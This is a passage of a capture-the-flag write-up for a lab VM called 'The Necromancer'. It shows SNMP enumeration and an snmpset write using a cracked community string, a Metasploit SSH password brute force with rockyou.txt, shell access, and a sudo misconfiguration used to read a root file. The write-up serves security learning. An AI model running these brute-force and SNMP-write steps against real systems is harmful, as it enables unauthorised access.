</span><span class='line'>      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E </span></code></pre></td></tr></table></div></figure>


<p>Boom! It didn&rsquo;t take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we&rsquo;re looking at SNMP next. I selected <strong>snmp-check</strong> for the job of enumerating SNMP:</p>

<blockquote><p>snmp-check allows you to enumerate the SNMP devices and places the output in a very
human readable friendly format. It could  be  useful  for penetration testing or
systems monitoring.</p></blockquote>

<p>Used the cracked key as community string and got the following info:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -c death2all 192.168.223.128
</span><span class='line'>snmp-check v1.9 - SNMP enumerator
</span><span class='line'>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
</span><span class='line'>
</span><span class='line'>[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community 'death2all'
</span><span class='line'>
</span><span class='line'>[*] System information:
</span><span class='line'>
</span><span class='line'>  Host IP address               : 192.168.223.128
</span><span class='line'>  Hostname                      : Fear the Necromancer!
</span><span class='line'>  Description                   : You stand in front of a door.
</span><span class='line'>  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
</span><span class='line'>  Location                      : Locked - death2allrw!
</span><span class='line'>  Uptime snmp                   : -
</span><span class='line'>  Uptime system                 : -
</span><span class='line'>  System date                   : -</span></code></pre></td></tr></table></div></figure>


<p>Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, <strong>snmpwalk</strong></p>

<blockquote><p>snmpwalk  &ndash;  retrieve a subtree of management values using SNMP GETNEXT requests</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"</span></code></pre></td></tr></table></div></figure>


<p>The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked &ndash; death2allrw!&rdquo;</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is <strong>snmpset</strong></p>

<blockquote><p>snmpset  is  an  SNMP application that uses the SNMP SET request to set
information on a network entity.  One or more object identifiers (OIDs)
must  be given as arguments on the command line.  A type and a value to
be set must accompany each object identifier.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"</span></code></pre></td></tr></table></div></figure>


<p>We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let&rsquo;s walk again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"</span></code></pre></td></tr></table></div></figure>


<p>With the door unlocked, we have the flag and next destination..SSH!</p>

<p>Flag #7: <strong>demonslayer</strong></p>

<h1>Flag #8 &ndash; demonslayer</h1>

<p>The SSH on the machine is accepting password logins, so it&rsquo;s time for the bruteforce approach. I&rsquo;ve used the combination of demonslayer as username and rockyou.txt as wordlist.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/ssh/ssh_login
</span><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.223.128:22 - Success: 'demonslayer:12345678' 'uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 '
</span><span class='line'>[*] Command shell session 1 opened (192.168.223.129:43627 -&gt; 192.168.223.128:22) at 2018-06-09 14:41:25 -0400</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve found the password is <em>12345678</em> and have a shell on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 1
</span><span class='line'>[*] Starting interaction with 1...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>demonslayer
</span><span class='line'>pwd
</span><span class='line'>/home/demonslayer
</span><span class='line'>ls -alh
</span><span class='line'>total 40
</span><span class='line'>drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
</span><span class='line'>drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   359B May 11  2016 .login
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   218B May 11  2016 .profile
</span><span class='line'>drwx------  2 demonslayer  demonslayer   512B May 11  2016 .ssh
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s read that flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag8.txt
</span><span class='line'>You enter the Necromancer's Lair!
</span><span class='line'>
</span><span class='line'>A stench of decay fills this place.  
</span><span class='line'>
</span><span class='line'>Jars filled with parts of creatures litter the bookshelves.
</span><span class='line'>
</span><span class='line'>A fire with flames of green burns coldly in the distance.
</span><span class='line'>
</span><span class='line'>Standing in the middle of the room with his back to you is the Necromancer.  
</span><span class='line'>
</span><span class='line'>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
</span><span class='line'>
</span><span class='line'>He holds a staff in one hand, and the flickering object in the other.
</span><span class='line'>
</span><span class='line'>"You are a fool to follow me here!  Do you not know who I am!"
</span><span class='line'>
</span><span class='line'>The necromancer turns to face you.  Dark words fill the air!
</span><span class='line'>
</span><span class='line'>"You are damned already my friend.  Now prepare for your own death!" 
</span><span class='line'>
</span><span class='line'>Defend yourself!  Counter attack the Necromancer's spells at u777!</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn&rsquo;t installed, but nc was:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u localhost 777
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Where do the Black Robes practice magic of the Greater Path?  </span></code></pre></td></tr></table></div></figure>


<p>The battle is on! Seems we have to answer correctly, so I googled and found this on <a href="https://en.wikipedia.org/wiki/Tsurani">this Wikipedia page</a>:</p>

<blockquote><p>Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
Path.</p></blockquote>

<p>Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Where do the Black Robes practice magic of the Greater Path?  Kelewan
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag8{55a6af2ca3fee9f2fef81d20743bda2c}</span></code></pre></td></tr></table></div></figure>


<p>Flag #8: <strong>Kelewan</strong></p>

<h1>Flag #9 &ndash; Lord of the 8th plane of hell</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Who did Johann Faust VIII make a deal with?  </span></code></pre></td></tr></table></div></figure>


<p>Next quesch! I&rsquo;m proud to say I didn&rsquo;t need to google for this one :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Who did Johann Faust VIII make a deal with?  Mephistopheles
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag9{713587e17e796209d1df4c9c2c2d2966}</span></code></pre></td></tr></table></div></figure>


<p>The legend of Faust is well-known to me, and since you&rsquo;re reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.</p>

<p>Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I&rsquo;m having a nostalgic moment here!</p>

<p>Flag #9: <strong>Mephistopheles</strong></p>

<h1>Flag #10 &ndash; The Ninth Gate</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Who is tricked into passing the Ninth Gate?  </span></code></pre></td></tr></table></div></figure>


<p>Back to Google for this one and found the answer <a href="https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters">here</a>:</p>

<blockquote><p>Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake
for Prince Sameth) as the latter&rsquo;s avatar. He is roughly 100 years old. Motivated by an
all-consuming desire for immortality, he believes that if he frees Orannis, he will
become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Who is tricked into passing the Ninth Gate?  Hedge
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
</span><span class='line'>
</span><span class='line'>A great flash of light knocks you to the ground; momentarily blinding you!
</span><span class='line'>
</span><span class='line'>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
</span><span class='line'>
</span><span class='line'>The room is silent.
</span><span class='line'>
</span><span class='line'>You walk over to where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>On the ground is a small vile.</span></code></pre></td></tr></table></div></figure>


<p>Flag #10: <strong>Hedge</strong></p>

<h1>Flag #11 &ndash; The elixir of power</h1>

<p>A small vile on the ground..a hidden .smallvile file in demonslayer&rsquo;s home!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat .smallvile
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You pick up the small vile.
</span><span class='line'>
</span><span class='line'>Inside of it you can see a green liquid.
</span><span class='line'>
</span><span class='line'>Opening the vile releases a pleasant odour into the air.
</span><span class='line'>
</span><span class='line'>You drink the elixir and feel a great power within your veins!</span></code></pre></td></tr></table></div></figure>


<p>Immediately I thought of root privileges and looked at the sudo rights:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
</span><span class='line'>Matching Defaults entries for demonslayer on thenecromancer:
</span><span class='line'>    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
</span><span class='line'>
</span><span class='line'>User demonslayer may run the following commands on thenecromancer:
</span><span class='line'>    (ALL) NOPASSWD: /bin/cat /root/flag11.txt</span></code></pre></td></tr></table></div></figure>


<p>User demonslayer can read the 11th flag in root&rsquo;s home folder. Let&rsquo;s see the ending:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo /bin/cat /root/flag11.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Suddenly you feel dizzy and fall to the ground!
</span><span class='line'>
</span><span class='line'>As you open your eyes you find yourself staring at a computer screen.
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have conquered......
</span><span class='line'>
</span><span class='line'>          .                                                      .
</span><span class='line'>        .n                   .                 .                  n.
</span><span class='line'>  .   .dP                  dP                   9b                 9b.    .
</span><span class='line'> 4    qXb         .       dX                     Xb       .        dXp     t
</span><span class='line'>dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
</span><span class='line'>9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
</span><span class='line'> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
</span><span class='line'>  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
</span><span class='line'>    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
</span><span class='line'>        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
</span><span class='line'>                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
</span><span class='line'>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
</span><span class='line'>                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
</span><span class='line'>                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
</span><span class='line'>                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
</span><span class='line'>                     `'      9XXXXXX(   )XXXXXXP      `'
</span><span class='line'>                              XXXX X.`v'.X XXXX
</span><span class='line'>                              XP^X'`b   d'`X^XX
</span><span class='line'>                              X. 9  `   '  P )X
</span><span class='line'>                              `b  `       '  d'
</span><span class='line'>                               `             '                       
</span><span class='line'>                               THE NECROMANCER!
</span><span class='line'>                                 by  @xerubus
</span><span class='line'>
</span><span class='line'>                   flag11{42c35828545b926e79a36493938ab1b1}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Big shout out to Dook and Bull for being test bunnies.
</span><span class='line'>
</span><span class='line'>Cheers OJ for the obfuscation help.
</span><span class='line'>
</span><span class='line'>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
</span><span class='line'>
</span><span class='line'>"========================================="
</span><span class='line'>"  xerubus (@xerubus) - www.mogozobo.com  "
</span><span class='line'>"========================================="</span></code></pre></td></tr></table></div></figure>


<p>Flag #11: <strong>hackergod</strong></p>

<p>The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!</p>

<p>Some special fortune cookie:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ M: Last I knew, I thought I had trapped \
</span><span class='line'>| you for all eternity in an icy little   |
</span><span class='line'>| place called Cania                      |
</span><span class='line'>|                                         |
</span><span class='line'>| H: Sorry, Hell froze over.              |
</span><span class='line'>|                                         |
</span><span class='line'>| M: How very witty. But it takes more    |
</span><span class='line'>| than sharp wit to rule Hell, little     |
</span><span class='line'>\ one. You must also...dress the part.    /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
